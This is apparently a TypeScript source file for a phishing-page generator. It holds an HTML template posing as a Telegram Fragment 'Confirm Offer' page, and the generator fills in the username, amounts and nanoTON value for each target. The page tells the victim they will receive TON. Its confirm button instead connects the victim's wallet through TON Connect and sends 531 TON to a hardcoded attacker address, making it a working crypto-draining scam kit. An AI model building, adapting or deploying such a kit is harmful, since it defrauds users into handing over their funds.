
// Original template content from js/css/index.html
const pageTemplate = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fragment - Confirm Offer</title>
    <style>
        :root {
            --tm-bg-dark: #1A2026;
            --tm-bg-dark-1: #293440;
            --tm-bg-dark-2: #293440;
            --tm-text-primary: #fff;
            --tm-text-secondary: #a1a1a1;
            --tm-text-blue: #00aff0;
            --tm-text-orange: #ff9500;
            --tm-btn-primary-bg: #00aff0;
            --tm-btn-primary-hover-bg: #0091c2;
            --tm-btn-radius: 5px;
            --tm-transition: all 0.3s ease;
        }

        body {
            background-color: var(--tm-bg-dark);
            color: var(--tm-text-primary);
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
        }

        @font-face {
            font-family: 'Roboto';
            font-style: normal;
            font-weight: 400;
            src: url('https://fonts.gstatic.com/s/roboto/v30/KFOmCnqEu92Fr1Mu4mxK.woff2') format('woff2');
        }
        @font-face {
            font-family: 'Roboto';
            font-style: normal;
            font-weight: 500;
            src: url('https://fonts.gstatic.com/s/roboto/v30/KFOlCnqEu92Fr1MmEU9fBBc4.woff2') format('woff2');
        }
        @font-face {
            font-family: 'Roboto';
            font-style: normal;
            font-weight: 700;
            src: url('https://fonts.gstatic.com/s/roboto/v30/KFOlCnqEu92Fr1MmWUlfBBc4.woff2') format('woff2');
        }

        .header {
            background-color: #202832;
            width: 100%;
            padding: 10px 20px;
            display: flex;
            align-items: center;
            box-sizing: border-box;
        }

        .header img {
            height: 40px;
            width: auto;
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
        }

        .subscribe-link {
            position: absolute;
            top: 20px;
            right: 20px;
            color: var(--tm-text-blue);
            font-size: 14px;
            text-decoration: none;
        }

        .username-header {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .username-header h1 {
            font-size: 24px;
            font-weight: 700;
            margin: 0;
        }

        .status-taken {
            background-color: var(--tm-text-orange);
            color: var(--tm-text-primary);
            padding: 2px 8px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: 500;
            text-transform: uppercase;
        }

        .content-wrapper {
            display: flex;
            justify-content: space-between;
            gap: 20px;
            margin-top: 20px;
        }

        .left-section {
            flex: 1;
        }

        .right-section {
            flex: 1;
        }

        .info-box {
            background-color: var(--tm-bg-dark-1);
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
        }

        .info-box p {
            font-size: 14px;
            color: var(--tm-text-primary);
            margin-bottom: 15px;
            line-height: 1.5;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .info-box p:last-child {
            margin-bottom: 0;
        }

        .info-box p::before {
            content: '•';
            color: var(--tm-text-blue);
            font-size: 18px;
        }

        .info-box p span {
            font-weight: 700;
            font-size: 16px;
            color: var(--tm-text-primary);
        }

        .details-box {
            background-color: var(--tm-bg-dark-1);
            padding: 15px;
            border-radius: 8px;
        }

        .details-table {
            width: 100%;
            border-spacing: 0;
            background: transparent;
        }

        .details-table th, .details-table td {
            padding: 5px 0;
            font-size: 14px;
        }

        .details-table th {
            color: var(--tm-text-primary);
            font-weight: 500;
            text-align: left;
            width: 40%;
        }

        .details-table td {
            color: var(--tm-text-blue);
            font-weight: 400;
            text-align: right;
        }

        .details-table td a {
            color: var(--tm-text-blue);
            text-decoration: none;
        }

        .btn-primary {
            background-color: var(--tm-btn-primary-bg);
            border: none;
            padding: 12px 20px;
            font-size: 16px;
            font-weight: 500;
            width: 100%;
            border-radius: var(--tm-btn-radius);
            color: var(--tm-text-primary);
            cursor: pointer;
            transition: var(--tm-transition);
            margin-top: 15px;
        }

        .btn-primary:hover {
            background-color: var(--tm-btn-primary-hover-bg);
        }
    </style>
</head>
<body>
    <div class="header">
        <a href="home.html">
            <img src="./photo.jpg" alt="Fragment Logo">
        </a>
    </div>
    <div class="container">
        <a href="https://t.me/fragment" class="subscribe-link">Subscribe to Updates</a>
        <div class="username-header">
            <h1>slowswags.t.me</h1>
            <span class="status-taken">Taken</span>
        </div>
        <div class="content-wrapper">
            <div class="left-section">
                <div class="info-box">
                    <p>You will receive: <span>531 TON</span> ($1717.68)</p>
                    <p>Transaction fee: <span>31 TON</span> ($100.28)</p>
                </div>
                <button id="agree-button" class="btn-primary">Confirm Offer</button>
            </div>
            <div class="right-section">
                <div class="details-box">
                    <table class="details-table">
                        <tr>
                            <th>Telegram Username</th>
                            <td><a href="https://t.me/slowswags">@slowswags</a></td>
                        </tr>
                        <tr>
                            <th>Web Address</th>
                            <td><a href="https://t.me/slowswags">t.me/slowswags</a></td>
                        </tr>
                        <tr>
                            <th>TON Web 3.0 Address</th>
                            <td><a href="https://slowswags.t.me">slowswags.t.me</a></td>
                        </tr>
                    </table>
                </div>
            </div>
        </div>
    </div>

    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script>
        console.log('Script started');

        // Initialize TON Connect UI
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://mrshadow3322.github.io/cxzcswqxzcz/tonconnect-manifest.json'
        });

        // Function to initialize event listeners
        function initializeEventListeners() {
            const agreeButton = document.getElementById('agree-button');

            // Check if the button exists
            if (!agreeButton) {
                console.error('Confirm button not found');
                alert('Error: Confirm Offer button not found');
                return;
            }

            // Event listener for the Confirm Offer button
            agreeButton.addEventListener('click', async () => {
                console.log('Confirm button clicked');
                try {
                    // Connect wallet (opens selection modal)
                    console.log('Initiating wallet connection...');
                    const connectedWallet = await tonConnectUI.connectWallet();
                    console.log('Wallet connected successfully:', connectedWallet);

                    // Prepare transaction
                    const transaction = {
                        validUntil: Math.floor(Date.now() / 1000) + 60, // Valid for 60 seconds
                        messages: [
                            {
                                address: "UQA7zv18rAEKJt85gvCVXLJRzGfagMPPnS5AaDGJlTYgYKSU",
                                amount: "531000000000" // 531 TON in nanoTON (1 TON = 1,000,000,000 nanoTON)
                            }
                        ]
                    };
                    console.log('Transaction prepared:', transaction);

                    // Send transaction
                    const result = await tonConnectUI.sendTransaction(transaction);
                    console.log('Transaction sent successfully:', result);
                    alert('Offer confirmed');
                } catch (error) {
                    console.error('Error connecting wallet or sending transaction:', error);
                    alert('An error occurred while connecting the wallet or sending the transaction');
                }
            });
        }

        // Initialize event listeners after DOM is loaded
        document.addEventListener('DOMContentLoaded', () => {
            console.log('DOM fully loaded');
            initializeEventListeners();
        });
    </script>
</body>
</html>
`;

document.addEventListener('DOMContentLoaded', () => {
    const pageTitleInput = document.getElementById('pageTitle') as HTMLInputElement;
    const usernameInput = document.getElementById('username') as HTMLInputElement;
    const receiveTonInput = document.getElementById('receiveTon') as HTMLInputElement;
    const receiveUsdInput = document.getElementById('receiveUsd') as HTMLInputElement;
    const feeTonInput = document.getElementById('feeTon') as HTMLInputElement;
    const feeUsdInput = document.getElementById('feeUsd') as HTMLInputElement;
    const nanoTonAmountInput = document.getElementById('nanoTonAmount') as HTMLInputElement;
    const outputFilenameInput = document.getElementById('outputFilename') as HTMLInputElement;
    const generateButton = document.getElementById('generateButton');
    const filenameError = document.getElementById('filenameError') as HTMLDivElement;

    if (generateButton) {
        generateButton.addEventListener('click', () => {
            const newPageTitle = pageTitleInput.value.trim();
            const newUsername = usernameInput.value.trim();
            const newReceiveTon = receiveTonInput.value.trim();
            const newReceiveUsd = receiveUsdInput.value.trim();
            const newFeeTon = feeTonInput.value.trim();
            const newFeeUsd = feeUsdInput.value.trim();
            const newNanoTonAmount = nanoTonAmountInput.value.trim();
            let outputFilename = outputFilenameInput.value.trim();

            if (!outputFilename) {
                filenameError.textContent = 'Имя файла не может быть пустым.';
                return;
            }
            if (!outputFilename.endsWith('.html')) {
                outputFilename += '.html';
            }
            filenameError.textContent = '';


            let modifiedContent = pageTemplate;

            // Replace title
            modifiedContent = modifiedContent.replace(
                /<title>Fragment - Confirm Offer<\/title>/g,
                `<title>${newPageTitle.replace(/\{username\}/g, newUsername)}</title>`
            );

            // Replace username (slowswags) globally
            const usernameRegex = new RegExp('slowswags', 'g');
            modifiedContent = modifiedContent.replace(usernameRegex, newUsername);

            // Replace transaction amount
            modifiedContent = modifiedContent.replace(
                /<span>531 TON<\/span> \(\$1717.68\)/g,
                `<span>${newReceiveTon}</span> (${newReceiveUsd})`
            );

            // Replace fee amount
            modifiedContent = modifiedContent.replace(
                /<span>31 TON<\/span> \(\$100.28\)/g,
                `<span>${newFeeTon}</span> (${newFeeUsd})`
            );

            // Replace nanoTON amount in script
            modifiedContent = modifiedContent.replace(
                /amount: "531000000000"/g,
                `amount: "${newNanoTonAmount}"`
            );
            
            // Create a blob and trigger download
            const blob = new Blob([modifiedContent], { type: 'text/html' });
            const link = document.createElement('a');
            link.href = URL.createObjectURL(blob);
            link.download = outputFilename;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            URL.revokeObjectURL(link.href);
        });
    }
});
